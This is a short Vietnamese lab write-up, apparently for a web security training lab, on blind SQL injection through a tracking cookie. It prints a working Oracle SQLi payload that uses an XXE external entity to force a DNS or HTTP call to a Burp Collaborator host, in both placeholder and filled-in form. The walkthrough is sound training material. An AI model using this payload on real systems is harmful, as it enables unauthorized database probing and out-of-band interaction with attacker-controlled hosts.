![Tổng quan](images/Pasted%20image%2020260619095623.png)
# Tổng quan 
Lab chứa lỗ hổng blind SQLi

Lab sử dụng tracking cookie để truy vấn SQL

SQL query thì không ảnh hưởng đến phản hồi của lab.

Ta có thể sử dụng trigger out-of-band interactions with an external domain.

# Khai thác
Ta sử dụng payload:
```SQL
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP_COLLABORATOR_SUBDOMAIN">+%25remote%3b]>'),'/l')+FROM+dual--
```
Phần Burp Collaborator subdomain ta có thể mở ở mục `Burp Collaborator`:

Bấm `Get Started`

Bấm Copy Link

=> Ta được payload:
```SQL
'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//1rt3n2x0luxhh9ehvno7doiwyn4es5gu.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```
![Gửi payload OOB SQLi với Burp Collaborator subdomain](images/Pasted%20image%2020260619101111.png)

Ta bấm send request rồi quay về `Burp Collaborator` click vào `poll now`:
![Poll now trong Burp Collaborator](images/Pasted%20image%2020260619101307.png)
Ta có thể thấy DNSlookup thành công
![DNS lookup thành công trên Burp Collaborator](images/Pasted%20image%2020260619101456.png)

=> Solved
